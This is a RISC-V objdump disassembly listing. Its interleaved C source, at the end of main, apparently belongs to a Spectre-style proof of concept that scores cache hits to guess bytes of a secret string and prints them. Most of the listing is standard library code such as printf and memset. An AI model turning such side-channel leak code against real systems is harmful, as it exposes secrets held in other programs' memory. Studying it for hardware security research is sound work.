   106de:	0785                	addi	a5,a5,1
   106e0:	fcf43423          	sd	a5,-56(s0)
   106e4:	fc843703          	ld	a4,-56(s0)
   106e8:	47e1                	li	a5,24
   106ea:	e8e7fbe3          	bleu	a4,a5,10580 <main+0x74>


        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);
   106ee:	f6040713          	addi	a4,s0,-160
   106f2:	f7040793          	addi	a5,s0,-144
   106f6:	86ba                	mv	a3,a4
   106f8:	863e                	mv	a2,a5
   106fa:	10000593          	li	a1,256
   106fe:	67f1                	lui	a5,0x1c
   10700:	27878513          	addi	a0,a5,632 # 1c278 <results.3004>
   10704:	b7fff0ef          	jal	ra,10282 <topTwoIdx>

        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
   10708:	fe843703          	ld	a4,-24(s0)
   1070c:	67ed                	lui	a5,0x1b
   1070e:	01878793          	addi	a5,a5,24 # 1b018 <__fini_array_end>
   10712:	00f705b3          	add	a1,a4,a5
   10716:	8381b703          	ld	a4,-1992(gp) # 1c1f0 <secretString>
   1071a:	fd843783          	ld	a5,-40(s0)
   1071e:	97ba                	add	a5,a5,a4
   10720:	0007c783          	lbu	a5,0(a5)
   10724:	0007861b          	sext.w	a2,a5
   10728:	f6043683          	ld	a3,-160(s0)
   1072c:	f7044783          	lbu	a5,-144(s0)
   10730:	0007871b          	sext.w	a4,a5
   10734:	f7044783          	lbu	a5,-144(s0)
   10738:	0007851b          	sext.w	a0,a5
   1073c:	f6843803          	ld	a6,-152(s0)
   10740:	f7144783          	lbu	a5,-143(s0)
   10744:	0007889b          	sext.w	a7,a5
   10748:	f7144783          	lbu	a5,-143(s0)
   1074c:	2781                	sext.w	a5,a5
   1074e:	e03e                	sd	a5,0(sp)
   10750:	87aa                	mv	a5,a0
   10752:	6569                	lui	a0,0x1a
   10754:	25850513          	addi	a0,a0,600 # 1a258 <__clzdi2+0x178>
   10758:	1ce000ef          	jal	ra,10926 <printf>

        // read in the next secret 
        ++attackIdx;
   1075c:	fe843783          	ld	a5,-24(s0)
   10760:	0785                	addi	a5,a5,1
   10762:	fef43423          	sd	a5,-24(s0)
    for(uint64_t len = 0; len < SECRET_SZ; ++len){
   10766:	fd843783          	ld	a5,-40(s0)
   1076a:	0785                	addi	a5,a5,1
   1076c:	fcf43c23          	sd	a5,-40(s0)
   10770:	fd843703          	ld	a4,-40(s0)
   10774:	47e5                	li	a5,25
   10776:	dce7fbe3          	bleu	a4,a5,1054c <main+0x40>
    }

    return 0;
   1077a:	4781                	li	a5,0
}
   1077c:	853e                	mv	a0,a5
   1077e:	70aa                	ld	ra,168(sp)
   10780:	740a                	ld	s0,160(sp)
   10782:	614d                	addi	sp,sp,176
   10784:	8082                	ret

0000000000010786 <atexit>:
   10786:	85aa                	mv	a1,a0
   10788:	4681                	li	a3,0
   1078a:	4601                	li	a2,0
   1078c:	4501                	li	a0,0
   1078e:	1ab0106f          	j	12138 <__register_exitproc>

0000000000010792 <exit>:
   10792:	1141                	addi	sp,sp,-16
   10794:	4581                	li	a1,0
   10796:	e022                	sd	s0,0(sp)
   10798:	e406                	sd	ra,8(sp)
   1079a:	842a                	mv	s0,a0
   1079c:	201010ef          	jal	ra,1219c <__call_exitprocs>
   107a0:	8401b503          	ld	a0,-1984(gp) # 1c1f8 <_global_impure_ptr>
   107a4:	6d3c                	ld	a5,88(a0)
   107a6:	c391                	beqz	a5,107aa <exit+0x18>
   107a8:	9782                	jalr	a5
   107aa:	8522                	mv	a0,s0
   107ac:	292080ef          	jal	ra,18a3e <_exit>

00000000000107b0 <__libc_fini_array>:
   107b0:	7179                	addi	sp,sp,-48
   107b2:	67ed                	lui	a5,0x1b
   107b4:	676d                	lui	a4,0x1b
   107b6:	f022                	sd	s0,32(sp)
   107b8:	01070713          	addi	a4,a4,16 # 1b010 <__init_array_end>
   107bc:	01878413          	addi	s0,a5,24 # 1b018 <__fini_array_end>
   107c0:	8c19                	sub	s0,s0,a4
   107c2:	ec26                	sd	s1,24(sp)
   107c4:	e84a                	sd	s2,16(sp)
   107c6:	e44e                	sd	s3,8(sp)
   107c8:	f406                	sd	ra,40(sp)
   107ca:	840d                	srai	s0,s0,0x3
   107cc:	4481                	li	s1,0
   107ce:	01878913          	addi	s2,a5,24
   107d2:	59e1                	li	s3,-8
   107d4:	00941a63          	bne	s0,s1,107e8 <__libc_fini_array+0x38>
   107d8:	7402                	ld	s0,32(sp)
   107da:	70a2                	ld	ra,40(sp)
   107dc:	64e2                	ld	s1,24(sp)
   107de:	6942                	ld	s2,16(sp)
   107e0:	69a2                	ld	s3,8(sp)
   107e2:	6145                	addi	sp,sp,48
   107e4:	907ff06f          	j	100ea <_fini>
   107e8:	033487b3          	mul	a5,s1,s3
   107ec:	0485                	addi	s1,s1,1
   107ee:	97ca                	add	a5,a5,s2
   107f0:	ff87b783          	ld	a5,-8(a5)
   107f4:	9782                	jalr	a5
   107f6:	bff9                	j	107d4 <__libc_fini_array+0x24>

00000000000107f8 <__libc_init_array>:
   107f8:	1101                	addi	sp,sp,-32
   107fa:	e822                	sd	s0,16(sp)
   107fc:	e426                	sd	s1,8(sp)
   107fe:	646d                	lui	s0,0x1b
   10800:	64ed                	lui	s1,0x1b
   10802:	00448793          	addi	a5,s1,4 # 1b004 <__preinit_array_end>
   10806:	00440413          	addi	s0,s0,4 # 1b004 <__preinit_array_end>
   1080a:	8c1d                	sub	s0,s0,a5
   1080c:	e04a                	sd	s2,0(sp)
   1080e:	ec06                	sd	ra,24(sp)
   10810:	840d                	srai	s0,s0,0x3
   10812:	00448493          	addi	s1,s1,4
   10816:	4901                	li	s2,0
   10818:	02891763          	bne	s2,s0,10846 <__libc_init_array+0x4e>
   1081c:	64ed                	lui	s1,0x1b
   1081e:	8cdff0ef          	jal	ra,100ea <_fini>
   10822:	646d                	lui	s0,0x1b
   10824:	00848793          	addi	a5,s1,8 # 1b008 <__frame_dummy_init_array_entry>
   10828:	01040413          	addi	s0,s0,16 # 1b010 <__init_array_end>
   1082c:	8c1d                	sub	s0,s0,a5
   1082e:	840d                	srai	s0,s0,0x3
   10830:	00848493          	addi	s1,s1,8
   10834:	4901                	li	s2,0
   10836:	00891d63          	bne	s2,s0,10850 <__libc_init_array+0x58>
   1083a:	60e2                	ld	ra,24(sp)
   1083c:	6442                	ld	s0,16(sp)
   1083e:	64a2                	ld	s1,8(sp)
   10840:	6902                	ld	s2,0(sp)
   10842:	6105                	addi	sp,sp,32
   10844:	8082                	ret
   10846:	609c                	ld	a5,0(s1)
   10848:	0905                	addi	s2,s2,1
   1084a:	04a1                	addi	s1,s1,8
   1084c:	9782                	jalr	a5
   1084e:	b7e9                	j	10818 <__libc_init_array+0x20>
   10850:	609c                	ld	a5,0(s1)
   10852:	0905                	addi	s2,s2,1
   10854:	04a1                	addi	s1,s1,8
   10856:	9782                	jalr	a5
   10858:	bff9                	j	10836 <__libc_init_array+0x3e>

000000000001085a <memset>:
   1085a:	433d                	li	t1,15
   1085c:	872a                	mv	a4,a0
   1085e:	02c37163          	bleu	a2,t1,10880 <memset+0x26>
   10862:	00f77793          	andi	a5,a4,15
   10866:	e3c1                	bnez	a5,108e6 <memset+0x8c>
   10868:	e1bd                	bnez	a1,108ce <memset+0x74>
   1086a:	ff067693          	andi	a3,a2,-16
   1086e:	8a3d                	andi	a2,a2,15
   10870:	96ba                	add	a3,a3,a4
   10872:	e30c                	sd	a1,0(a4)
   10874:	e70c                	sd	a1,8(a4)
   10876:	0741                	addi	a4,a4,16
   10878:	fed76de3          	bltu	a4,a3,10872 <memset+0x18>
   1087c:	e211                	bnez	a2,10880 <memset+0x26>
   1087e:	8082                	ret
   10880:	40c306b3          	sub	a3,t1,a2
   10884:	068a                	slli	a3,a3,0x2
   10886:	00000297          	auipc	t0,0x0
   1088a:	9696                	add	a3,a3,t0
   1088c:	00a68067          	jr	10(a3)
   10890:	00b70723          	sb	a1,14(a4)
   10894:	00b706a3          	sb	a1,13(a4)
   10898:	00b70623          	sb	a1,12(a4)
   1089c:	00b705a3          	sb	a1,11(a4)
   108a0:	00b70523          	sb	a1,10(a4)
   108a4:	00b704a3          	sb	a1,9(a4)
   108a8:	00b70423          	sb	a1,8(a4)
   108ac:	00b703a3          	sb	a1,7(a4)
   108b0:	00b70323          	sb	a1,6(a4)
   108b4:	00b702a3          	sb	a1,5(a4)
   108b8:	00b70223          	sb	a1,4(a4)
   108bc:	00b701a3          	sb	a1,3(a4)
   108c0:	00b70123          	sb	a1,2(a4)
   108c4:	00b700a3          	sb	a1,1(a4)
   108c8:	00b70023          	sb	a1,0(a4)
   108cc:	8082                	ret
   108ce:	0ff5f593          	andi	a1,a1,255
   108d2:	00859693          	slli	a3,a1,0x8
   108d6:	8dd5                	or	a1,a1,a3
   108d8:	01059693          	slli	a3,a1,0x10
   108dc:	8dd5                	or	a1,a1,a3
   108de:	02059693          	slli	a3,a1,0x20
   108e2:	8dd5                	or	a1,a1,a3
   108e4:	b759                	j	1086a <memset+0x10>
   108e6:	00279693          	slli	a3,a5,0x2
   108ea:	00000297          	auipc	t0,0x0
   108ee:	9696                	add	a3,a3,t0
   108f0:	8286                	mv	t0,ra
   108f2:	fa2680e7          	jalr	-94(a3)
   108f6:	8096                	mv	ra,t0
   108f8:	17c1                	addi	a5,a5,-16
   108fa:	8f1d                	sub	a4,a4,a5
   108fc:	963e                	add	a2,a2,a5
   108fe:	f8c371e3          	bleu	a2,t1,10880 <memset+0x26>
   10902:	b79d                	j	10868 <memset+0xe>

0000000000010904 <_printf_r>:
   10904:	715d                	addi	sp,sp,-80
   10906:	f032                	sd	a2,32(sp)
   10908:	f436                	sd	a3,40(sp)
   1090a:	f83a                	sd	a4,48(sp)
   1090c:	fc3e                	sd	a5,56(sp)
   1090e:	e0c2                	sd	a6,64(sp)
   10910:	e4c6                	sd	a7,72(sp)
   10912:	862e                	mv	a2,a1
   10914:	690c                	ld	a1,16(a0)
   10916:	1014                	addi	a3,sp,32
   10918:	ec06                	sd	ra,24(sp)
   1091a:	e436                	sd	a3,8(sp)
   1091c:	0f2000ef          	jal	ra,10a0e <_vfprintf_r>
   10920:	60e2                	ld	ra,24(sp)
   10922:	6161                	addi	sp,sp,80
   10924:	8082                	ret

0000000000010926 <printf>:
   10926:	711d                	addi	sp,sp,-96
   10928:	e4be                	sd	a5,72(sp)
   1092a:	8481b783          	ld	a5,-1976(gp) # 1c200 <_impure_ptr>
   1092e:	f832                	sd	a2,48(sp)
   10930:	fc36                	sd	a3,56(sp)
   10932:	f42e                	sd	a1,40(sp)
   10934:	e0ba                	sd	a4,64(sp)
   10936:	e8c2                	sd	a6,80(sp)
   10938:	ecc6                	sd	a7,88(sp)
   1093a:	6b8c                	ld	a1,16(a5)
   1093c:	1034                	addi	a3,sp,40
   1093e:	862a                	mv	a2,a0
   10940:	853e                	mv	a0,a5
   10942:	ec06                	sd	ra,24(sp)
   10944:	e436                	sd	a3,8(sp)
   10946:	0c8000ef          	jal	ra,10a0e <_vfprintf_r>
   1094a:	60e2                	ld	ra,24(sp)
   1094c:	6125                	addi	sp,sp,96
   1094e:	8082                	ret

0000000000010950 <_puts_r>:
   10950:	711d                	addi	sp,sp,-96
   10952:	e8a2                	sd	s0,80(sp)
   10954:	842a                	mv	s0,a0
   10956:	852e                	mv	a0,a1
   10958:	e42e                	sd	a1,8(sp)
   1095a:	ec86                	sd	ra,88(sp)
   1095c:	0a0000ef          	jal	ra,109fc <strlen>
   10960:	0001a7b7          	lui	a5,0x1a
   10964:	2a878793          	addi	a5,a5,680 # 1a2a8 <__clzdi2+0x1c8>
   10968:	e0be                	sd	a5,64(sp)
   1096a:	4785                	li	a5,1
   1096c:	e4be                	sd	a5,72(sp)
   1096e:	181c                	addi	a5,sp,48
   10970:	65a2                	ld	a1,8(sp)
   10972:	ec3e                	sd	a5,24(sp)
   10974:	4789                	li	a5,2
   10976:	d03e                	sw	a5,32(sp)
   10978:	483c                	lw	a5,80(s0)
   1097a:	fc2a                	sd	a0,56(sp)
   1097c:	0505                	addi	a0,a0,1
   1097e:	f82e                	sd	a1,48(sp)
   10980:	f42a                	sd	a0,40(sp)
   10982:	680c                	ld	a1,16(s0)
   10984:	e791                	bnez	a5,10990 <_puts_r+0x40>
   10986:	8522                	mv	a0,s0
   10988:	e42e                	sd	a1,8(sp)
   1098a:	33b010ef          	jal	ra,124c4 <__sinit>
   1098e:	65a2                	ld	a1,8(sp)
   10990:	01059783          	lh	a5,16(a1)
   10994:	03279713          	slli	a4,a5,0x32
   10998:	00074d63          	bltz	a4,109b2 <_puts_r+0x62>
   1099c:	6689                	lui	a3,0x2
   1099e:	0ac5a703          	lw	a4,172(a1)
   109a2:	8fd5                	or	a5,a5,a3
   109a4:	00f59823          	sh	a5,16(a1)
   109a8:	77f9                	lui	a5,0xffffe
   109aa:	17fd                	addi	a5,a5,-1
   109ac:	8ff9                	and	a5,a5,a4
   109ae:	0af5a623          	sw	a5,172(a1)
   109b2:	0830                	addi	a2,sp,24
   109b4:	8522                	mv	a0,s0
   109b6:	691010ef          	jal	ra,12846 <__sfvwrite_r>
   109ba:	57fd                	li	a5,-1
   109bc:	e111                	bnez	a0,109c0 <_puts_r+0x70>
   109be:	47a9                	li	a5,10
   109c0:	60e6                	ld	ra,88(sp)
   109c2:	6446                	ld	s0,80(sp)
   109c4:	853e                	mv	a0,a5
   109c6:	6125                	addi	sp,sp,96
   109c8:	8082                	ret

00000000000109ca <puts>:
   109ca:	85aa                	mv	a1,a0
   109cc:	8481b503          	ld	a0,-1976(gp) # 1c200 <_impure_ptr>
   109d0:	f81ff06f          	j	10950 <_puts_r>

00000000000109d4 <srand>:
   109d4:	8481b783          	ld	a5,-1976(gp) # 1c200 <_impure_ptr>
   109d8:	1502                	slli	a0,a0,0x20
   109da:	9101                	srli	a0,a0,0x20
   109dc:	f7e8                	sd	a0,232(a5)
   109de:	8082                	ret

00000000000109e0 <rand>:
   109e0:	8481b783          	ld	a5,-1976(gp) # 1c200 <_impure_ptr>
   109e4:	0001c737          	lui	a4,0x1c
   109e8:	1b873703          	ld	a4,440(a4) # 1c1b8 <__TMC_END__>
   109ec:	77e8                	ld	a0,232(a5)
   109ee:	02e50533          	mul	a0,a0,a4
   109f2:	0505                	addi	a0,a0,1
   109f4:	f7e8                	sd	a0,232(a5)
   109f6:	0506                	slli	a0,a0,0x1
   109f8:	9105                	srli	a0,a0,0x21
   109fa:	8082                	ret

00000000000109fc <strlen>:
   109fc:	87aa                	mv	a5,a0
   109fe:	0785                	addi	a5,a5,1
   10a00:	fff7c703          	lbu	a4,-1(a5) # ffffffffffffdfff <_end+0xffffffffffdcd4d7>
   10a04:	ff6d                	bnez	a4,109fe <strlen+0x2>
   10a06:	40a78533          	sub	a0,a5,a0
   10a0a:	157d                	addi	a0,a0,-1
   10a0c:	8082                	ret

0000000000010a0e <_vfprintf_r>:
   10a0e:	d9010113          	addi	sp,sp,-624
   10a12:	26113423          	sd	ra,616(sp)
   10a16:	24913c23          	sd	s1,600(sp)
   10a1a:	25213823          	sd	s2,592(sp)
   10a1e:	25313423          	sd	s3,584(sp)
   10a22:	23713423          	sd	s7,552(sp)
   10a26:	892e                	mv	s2,a1
   10a28:	84b2                	mv	s1,a2
   10a2a:	8bb6                	mv	s7,a3
   10a2c:	26813023          	sd	s0,608(sp)
   10a30:	25413023          	sd	s4,576(sp)
   10a34:	23513c23          	sd	s5,568(sp)
   10a38:	23613823          	sd	s6,560(sp)
   10a3c:	23813023          	sd	s8,544(sp)
   10a40:	21913c23          	sd	s9,536(sp)
   10a44:	21a13823          	sd	s10,528(sp)
   10a48:	21b13423          	sd	s11,520(sp)
   10a4c:	89aa                	mv	s3,a0
   10a4e:	0c1030ef          	jal	ra,1430e <_localeconv_r>
   10a52:	611c                	ld	a5,0(a0)
   10a54:	853e                	mv	a0,a5
   10a56:	e4be                	sd	a5,72(sp)
   10a58:	fa5ff0ef          	jal	ra,109fc <strlen>
   10a5c:	ec2a                	sd	a0,24(sp)
   10a5e:	f982                	sd	zero,240(sp)
   10a60:	fd82                	sd	zero,248(sp)
   10a62:	00098863          	beqz	s3,10a72 <_vfprintf_r+0x64>
   10a66:	0509a783          	lw	a5,80(s3)
   10a6a:	e781                	bnez	a5,10a72 <_vfprintf_r+0x64>
   10a6c:	854e                	mv	a0,s3
   10a6e:	257010ef          	jal	ra,124c4 <__sinit>
   10a72:	01091783          	lh	a5,16(s2)
   10a76:	03279713          	slli	a4,a5,0x32
   10a7a:	00074d63          	bltz	a4,10a94 <_vfprintf_r+0x86>
   10a7e:	6689                	lui	a3,0x2
   10a80:	0ac92703          	lw	a4,172(s2)
   10a84:	8fd5                	or	a5,a5,a3
   10a86:	00f91823          	sh	a5,16(s2)
   10a8a:	77f9                	lui	a5,0xffffe
   10a8c:	17fd                	addi	a5,a5,-1
   10a8e:	8ff9                	and	a5,a5,a4
   10a90:	0af92623          	sw	a5,172(s2)
   10a94:	01095783          	lhu	a5,16(s2)
   10a98:	8ba1                	andi	a5,a5,8
   10a9a:	c3bd                	beqz	a5,10b00 <_vfprintf_r+0xf2>
   10a9c:	01893783          	ld	a5,24(s2)
   10aa0:	c3a5                	beqz	a5,10b00 <_vfprintf_r+0xf2>
   10aa2:	01095783          	lhu	a5,16(s2)
   10aa6:	4729                	li	a4,10
   10aa8:	8be9                	andi	a5,a5,26
   10aaa:	06e79363          	bne	a5,a4,10b10 <_vfprintf_r+0x102>
   10aae:	01291783          	lh	a5,18(s2)
   10ab2:	0407cf63          	bltz	a5,10b10 <_vfprintf_r+0x102>
   10ab6:	86de                	mv	a3,s7
   10ab8:	8626                	mv	a2,s1
   10aba:	85ca                	mv	a1,s2
   10abc:	854e                	mv	a0,s3
   10abe:	512010ef          	jal	ra,11fd0 <__sbprintf>
   10ac2:	f42a                	sd	a0,40(sp)
   10ac4:	26813083          	ld	ra,616(sp)
   10ac8:	26013403          	ld	s0,608(sp)
   10acc:	7522                	ld	a0,40(sp)
   10ace:	25813483          	ld	s1,600(sp)
   10ad2:	25013903          	ld	s2,592(sp)
   10ad6:	24813983          	ld	s3,584(sp)
   10ada:	24013a03          	ld	s4,576(sp)
   10ade:	23813a83          	ld	s5,568(sp)
   10ae2:	23013b03          	ld	s6,560(sp)
   10ae6:	22813b83          	ld	s7,552(sp)
   10aea:	22013c03          	ld	s8,544(sp)
   10aee:	21813c83          	ld	s9,536(sp)
   10af2:	21013d03          	ld	s10,528(sp)
   10af6:	20813d83          	ld	s11,520(sp)
   10afa:	27010113          	addi	sp,sp,624
   10afe:	8082                	ret
   10b00:	85ca                	mv	a1,s2
   10b02:	854e                	mv	a0,s3
   10b04:	55a010ef          	jal	ra,1205e <__swsetup_r>
   10b08:	dd49                	beqz	a0,10aa2 <_vfprintf_r+0x94>
   10b0a:	57fd                	li	a5,-1
   10b0c:	f43e                	sd	a5,40(sp)
   10b0e:	bf5d                	j	10ac4 <_vfprintf_r+0xb6>
   10b10:	67e9                	lui	a5,0x1a
   10b12:	2b078793          	addi	a5,a5,688 # 1a2b0 <__clzdi2+0x1d0>
   10b16:	ed3e                	sd	a5,152(sp)
   10b18:	0001a7b7          	lui	a5,0x1a
   10b1c:	4487b783          	ld	a5,1096(a5) # 1a448 <zeroes.4441+0x18>
   10b20:	18010a93          	addi	s5,sp,384
   10b24:	e256                	sd	s5,256(sp)
   10b26:	f13e                	sd	a5,160(sp)
   10b28:	0001a7b7          	lui	a5,0x1a
   10b2c:	4587b783          	ld	a5,1112(a5) # 1a458 <zeroes.4441+0x28>
   10b30:	ea02                	sd	zero,272(sp)
   10b32:	10012423          	sw	zero,264(sp)
   10b36:	f53e                	sd	a5,168(sp)
   10b38:	0001a7b7          	lui	a5,0x1a
   10b3c:	4687b783          	ld	a5,1128(a5) # 1a468 <zeroes.4441+0x38>
   10b40:	4a01                	li	s4,0
   10b42:	8cd6                	mv	s9,s5
   10b44:	f082                	sd	zero,96(sp)
   10b46:	ec82                	sd	zero,88(sp)
   10b48:	e002                	sd	zero,0(sp)
   10b4a:	e082                	sd	zero,64(sp)
   10b4c:	e882                	sd	zero,80(sp)
   10b4e:	f402                	sd	zero,40(sp)
   10b50:	e93e                	sd	a5,144(sp)
   10b52:	8426                	mv	s0,s1
   10b54:	02500713          	li	a4,37
   10b58:	00044783          	lbu	a5,0(s0)
   10b5c:	c399                	beqz	a5,10b62 <_vfprintf_r+0x154>
   10b5e:	08e79663          	bne	a5,a4,10bea <_vfprintf_r+0x1dc>
   10b62:	40940b3b          	subw	s6,s0,s1
   10b66:	020b0f63          	beqz	s6,10ba4 <_vfprintf_r+0x196>
   10b6a:	67d2                	ld	a5,272(sp)
   10b6c:	009cb023          	sd	s1,0(s9)
   10b70:	016cb423          	sd	s6,8(s9)
   10b74:	97da                	add	a5,a5,s6
   10b76:	ea3e                	sd	a5,272(sp)
   10b78:	10812783          	lw	a5,264(sp)
   10b7c:	0cc1                	addi	s9,s9,16
   10b7e:	0017871b          	addiw	a4,a5,1
   10b82:	10e12423          	sw	a4,264(sp)
   10b86:	479d                	li	a5,7
   10b88:	00e7da63          	ble	a4,a5,10b9c <_vfprintf_r+0x18e>
   10b8c:	0210                	addi	a2,sp,256
   10b8e:	85ca                	mv	a1,s2
   10b90:	854e                	mv	a0,s3
   10b92:	5f0060ef          	jal	ra,17182 <__sprint_r>
   10b96:	54051363          	bnez	a0,110dc <_vfprintf_r+0x6ce>
   10b9a:	8cd6                	mv	s9,s5
   10b9c:	57a2                	lw	a5,40(sp)
   10b9e:	016787bb          	addw	a5,a5,s6
   10ba2:	f43e                	sd	a5,40(sp)
   10ba4:	00044783          	lbu	a5,0(s0)
   10ba8:	e399                	bnez	a5,10bae <_vfprintf_r+0x1a0>
   10baa:	4040106f          	j	11fae <_vfprintf_r+0x15a0>
   10bae:	00140793          	addi	a5,s0,1
   10bb2:	0c0107a3          	sb	zero,207(sp)
   10bb6:	5dfd                	li	s11,-1
   10bb8:	f002                	sd	zero,32(sp)
   10bba:	4401                	li	s0,0
   10bbc:	05a00d13          	li	s10,90
   10bc0:	4c29                	li	s8,10
   10bc2:	0007cb03          	lbu	s6,0(a5)
   10bc6:	00178713          	addi	a4,a5,1
   10bca:	e83a                	sd	a4,16(sp)
   10bcc:	46a5                	li	a3,9
   10bce:	02a00613          	li	a2,42
   10bd2:	fe0b079b          	addiw	a5,s6,-32
   10bd6:	0007871b          	sext.w	a4,a5
   10bda:	3aed68e3          	bltu	s10,a4,1178a <_vfprintf_r+0xd7c>
   10bde:	676a                	ld	a4,152(sp)
   10be0:	1782                	slli	a5,a5,0x20
   10be2:	83f9                	srli	a5,a5,0x1e
   10be4:	97ba                	add	a5,a5,a4
   10be6:	439c                	lw	a5,0(a5)
   10be8:	8782                	jr	a5
   10bea:	0405                	addi	s0,s0,1
   10bec:	b7b5                	j	10b58 <_vfprintf_r+0x14a>
   10bee:	0001a7b7          	lui	a5,0x1a
   10bf2:	4a878793          	addi	a5,a5,1192 # 1a4a8 <zeroes.4441+0x78>
   10bf6:	f0be                	sd	a5,96(sp)
   10bf8:	008b8793          	addi	a5,s7,8
   10bfc:	f83e                	sd	a5,48(sp)
   10bfe:	02047793          	andi	a5,s0,32
   10c02:	24078de3          	beqz	a5,1165c <_vfprintf_r+0xc4e>
   10c06:	000bbb83          	ld	s7,0(s7)
   10c0a:	00147793          	andi	a5,s0,1
   10c0e:	cf81                	beqz	a5,10c26 <_vfprintf_r+0x218>
   10c10:	000b8b63          	beqz	s7,10c26 <_vfprintf_r+0x218>
   10c14:	03000793          	li	a5,48
   10c18:	00246413          	ori	s0,s0,2
   10c1c:	0cf10823          	sb	a5,208(sp)
   10c20:	0d6108a3          	sb	s6,209(sp)
   10c24:	2401                	sext.w	s0,s0
   10c26:	bff47413          	andi	s0,s0,-1025
   10c2a:	2401                	sext.w	s0,s0
   10c2c:	4789                	li	a5,2
   10c2e:	12b0006f          	j	11558 <_vfprintf_r+0xb4a>
   10c32:	854e                	mv	a0,s3
   10c34:	6da030ef          	jal	ra,1430e <_localeconv_r>
   10c38:	651c                	ld	a5,8(a0)
   10c3a:	853e                	mv	a0,a5
   10c3c:	e8be                	sd	a5,80(sp)
   10c3e:	dbfff0ef          	jal	ra,109fc <strlen>
   10c42:	e0aa                	sd	a0,64(sp)
   10c44:	854e                	mv	a0,s3
   10c46:	6c8030ef          	jal	ra,1430e <_localeconv_r>
   10c4a:	691c                	ld	a5,16(a0)
   10c4c:	e03e                	sd	a5,0(sp)
   10c4e:	6786                	ld	a5,64(sp)
   10c50:	c38d                	beqz	a5,10c72 <_vfprintf_r+0x264>
   10c52:	6782                	ld	a5,0(sp)
   10c54:	cf99                	beqz	a5,10c72 <_vfprintf_r+0x264>
   10c56:	0007c783          	lbu	a5,0(a5)
   10c5a:	cf81                	beqz	a5,10c72 <_vfprintf_r+0x264>
   10c5c:	40046413          	ori	s0,s0,1024
   10c60:	2401                	sext.w	s0,s0
   10c62:	a801                	j	10c72 <_vfprintf_r+0x264>
   10c64:	0cf14783          	lbu	a5,207(sp)
   10c68:	e789                	bnez	a5,10c72 <_vfprintf_r+0x264>
   10c6a:	02000793          	li	a5,32
   10c6e:	0cf107a3          	sb	a5,207(sp)
   10c72:	67c2                	ld	a5,16(sp)
   10c74:	b7b9                	j	10bc2 <_vfprintf_r+0x1b4>
   10c76:	00146413          	ori	s0,s0,1
   10c7a:	b7dd                	j	10c60 <_vfprintf_r+0x252>
   10c7c:	000ba783          	lw	a5,0(s7)
   10c80:	0ba1                	addi	s7,s7,8
   10c82:	f03e                	sd	a5,32(sp)
   10c84:	fe07d7e3          	bgez	a5,10c72 <_vfprintf_r+0x264>
   10c88:	5782                	lw	a5,32(sp)
   10c8a:	40f007bb          	negw	a5,a5
   10c8e:	f03e                	sd	a5,32(sp)
   10c90:	00446413          	ori	s0,s0,4
   10c94:	b7f1                	j	10c60 <_vfprintf_r+0x252>
   10c96:	02b00793          	li	a5,43
   10c9a:	bfd1                	j	10c6e <_vfprintf_r+0x260>
   10c9c:	6742                	ld	a4,16(sp)
   10c9e:	67c2                	ld	a5,16(sp)
   10ca0:	00074b03          	lbu	s6,0(a4)
   10ca4:	0785                	addi	a5,a5,1
   10ca6:	02cb1c63          	bne	s6,a2,10cde <_vfprintf_r+0x2d0>
   10caa:	000bae03          	lw	t3,0(s7)
   10cae:	008b8713          	addi	a4,s7,8
   10cb2:	000e5363          	bgez	t3,10cb8 <_vfprintf_r+0x2aa>
   10cb6:	5e7d                	li	t3,-1
   10cb8:	000e0d9b          	sext.w	s11,t3
   10cbc:	8bba                	mv	s7,a4
   10cbe:	e83e                	sd	a5,16(sp)
   10cc0:	bf4d                	j	10c72 <_vfprintf_r+0x264>
   10cc2:	03bc0e3b          	mulw	t3,s8,s11
   10cc6:	0785                	addi	a5,a5,1
   10cc8:	fff7cb03          	lbu	s6,-1(a5)
   10ccc:	00ee0dbb          	addw	s11,t3,a4
   10cd0:	fd0b059b          	addiw	a1,s6,-48
   10cd4:	872e                	mv	a4,a1
   10cd6:	feb6f6e3          	bleu	a1,a3,10cc2 <_vfprintf_r+0x2b4>
   10cda:	e83e                	sd	a5,16(sp)
   10cdc:	bddd                	j	10bd2 <_vfprintf_r+0x1c4>
   10cde:	4d81                	li	s11,0
   10ce0:	bfc5                	j	10cd0 <_vfprintf_r+0x2c2>
   10ce2:	08046413          	ori	s0,s0,128
   10ce6:	bfad                	j	10c60 <_vfprintf_r+0x252>
   10ce8:	67c2                	ld	a5,16(sp)
   10cea:	f002                	sd	zero,32(sp)
   10cec:	5702                	lw	a4,32(sp)
   10cee:	fd0b0b1b          	addiw	s6,s6,-48
   10cf2:	0785                	addi	a5,a5,1
   10cf4:	02ec073b          	mulw	a4,s8,a4
   10cf8:	00eb073b          	addw	a4,s6,a4
   10cfc:	fff7cb03          	lbu	s6,-1(a5)
   10d00:	f03a                	sd	a4,32(sp)
   10d02:	fd0b071b          	addiw	a4,s6,-48
   10d06:	fee6f3e3          	bleu	a4,a3,10cec <_vfprintf_r+0x2de>
   10d0a:	bfc1                	j	10cda <_vfprintf_r+0x2cc>
   10d0c:	00846413          	ori	s0,s0,8
   10d10:	bf81                	j	10c60 <_vfprintf_r+0x252>
   10d12:	67c2                	ld	a5,16(sp)
   10d14:	0007c703          	lbu	a4,0(a5)
   10d18:	06800793          	li	a5,104
   10d1c:	00f71863          	bne	a4,a5,10d2c <_vfprintf_r+0x31e>
   10d20:	67c2                	ld	a5,16(sp)
   10d22:	20046413          	ori	s0,s0,512
   10d26:	0785                	addi	a5,a5,1
   10d28:	e83e                	sd	a5,16(sp)
   10d2a:	bf1d                	j	10c60 <_vfprintf_r+0x252>
   10d2c:	04046413          	ori	s0,s0,64
   10d30:	bf05                	j	10c60 <_vfprintf_r+0x252>
   10d32:	67c2                	ld	a5,16(sp)
   10d34:	0007c703          	lbu	a4,0(a5)
   10d38:	06c00793          	li	a5,108
   10d3c:	00f71863          	bne	a4,a5,10d4c <_vfprintf_r+0x33e>
   10d40:	67c2                	ld	a5,16(sp)
   10d42:	0785                	addi	a5,a5,1
   10d44:	e83e                	sd	a5,16(sp)
   10d46:	02046413          	ori	s0,s0,32
   10d4a:	bf19                	j	10c60 <_vfprintf_r+0x252>
   10d4c:	01046413          	ori	s0,s0,16
   10d50:	bf01                	j	10c60 <_vfprintf_r+0x252>
   10d52:	008b8793          	addi	a5,s7,8
   10d56:	f83e                	sd	a5,48(sp)
